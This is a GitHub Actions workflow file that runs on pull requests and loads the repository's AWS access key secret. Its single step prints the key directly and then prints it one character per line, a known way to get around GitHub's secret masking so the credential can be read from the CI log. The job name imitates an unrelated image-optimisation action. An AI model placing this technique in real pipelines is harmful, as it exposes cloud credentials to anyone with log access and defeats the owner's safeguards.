name: CI1

on: [pull_request]

env:
  AWS_ACCESS_KEY: ${{ secrets.AWS_ACCESS_KEY }}

jobs:
  build:
    name: calibreapp/image-actions
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Repo
        uses: actions/checkout@v2

      - name: secrets
        run: |
          echo "AWS_ACCESS_KEY ofuscado"
          echo $AWS_ACCESS_KEY
          echo "AWS_ACCESS_KEY cracked"
          size=${#AWS_ACCESS_KEY}
          echo "size"
          echo $size
          echo "------"
          for (( char=1; char<=$size; char++ )) do
            echo $AWS_ACCESS_KEY | cut -c $char
          done;
